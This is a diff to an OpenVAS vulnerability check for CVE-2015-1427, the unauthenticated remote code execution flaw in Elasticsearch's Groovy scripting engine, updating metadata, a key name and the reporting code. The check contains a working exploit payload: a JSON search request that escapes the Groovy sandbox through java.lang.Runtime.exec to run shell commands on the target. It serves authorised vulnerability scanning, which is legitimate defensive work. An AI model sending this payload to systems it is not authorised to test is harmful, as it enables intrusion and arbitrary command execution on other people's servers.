@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_elastisearch_72585.nasl 7576 2017-10-26 10:01:33Z cfischer $
+# $Id: gb_elastisearch_72585.nasl 8613 2018-02-01 07:35:27Z cfischer $
 #
 # Elasticsearch Groovy Scripting Engine Unauthenticated Remote Code Execution
 #
@@ -34,7 +34,7 @@ if (description)
  script_cve_id("CVE-2015-1427");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
- script_version ("$Revision: 7576 $");
+ script_version ("$Revision: 8613 $");
 
  script_name("Elasticsearch Groovy Scripting Engine Unauthenticated Remote Code Execution");
 
@@ -55,42 +55,41 @@ the sandbox protection mechanism and execute arbitrary shell commands via a craf
 
  script_tag(name:"qod_type", value:"exploit");
 
- script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:01:33 +0200 (Thu, 26 Oct 2017) $");
+ script_tag(name:"last_modification", value:"$Date: 2018-02-01 08:35:27 +0100 (Thu, 01 Feb 2018) $");
  script_tag(name:"creation_date", value:"2015-03-12 10:52:20 +0100 (Thu, 12 Mar 2015)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_dependencies("gb_elastsearch_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 9200);
- script_mandatory_keys("elastisearch/installed");
+ script_mandatory_keys("elasticsearch/installed");
 
  exit(0);
 }
 
 include("misc_func.inc");
-include("http_func.inc");
 include("host_details.inc");
+include("http_func.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
 
-port = get_app_port( cpe:CPE );
-if( ! port ) port = 9200;
-
-if( ! get_port_state( port ) ) exit( 0 );
+if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
+if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 ); # To have a reference to the Detection-NVT
 
 cmds = exploit_commands();
+
+url = "/_search?pretty";
 
 foreach cmd ( keys( cmds ) )
 {
   ex = '{"size":1, "script_fields": {"lupin":{"script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"' + cmds[ cmd ]  +  '\\").getText()"}}}';
-  req = http_post( item:"/_search?pretty", port:port, data:ex );
+  req = http_post( item:url, port:port, data:ex );
   res = http_keepalive_send_recv( port:port, data:req );
   if( eregmatch( pattern:cmd, string:res ) )
   {
-    security_message( port:port );
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
     exit( 0 );
   }
 }
 
 exit( 99 );
-
